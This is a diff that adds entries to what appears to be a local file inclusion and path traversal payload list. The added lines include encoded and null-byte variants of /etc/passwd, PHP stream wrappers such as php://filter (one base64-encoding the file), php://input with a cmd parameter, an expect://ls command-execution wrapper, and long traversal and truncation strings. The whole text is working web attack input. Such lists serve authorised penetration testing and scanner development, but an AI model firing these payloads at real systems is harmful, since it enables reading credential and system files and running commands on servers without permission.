@@ -6,4 +6,11 @@ etc%5cpasswd
 etc%5cpasswd%00
 etc%c0%afpasswd
 etc%c0%afpasswd%00
+etc/passwd%2500
 file:///etc/passwd
+php://filter/resource=/etc/passwd
+php://input&cmd=ls
+expect://ls
+php://filter/convert.base64-encode/resource=/etc/passwd
+etc/passwd…………………………………………………………………………….
+etc/passwd/../../../../../../../../../../../../../../../../../..
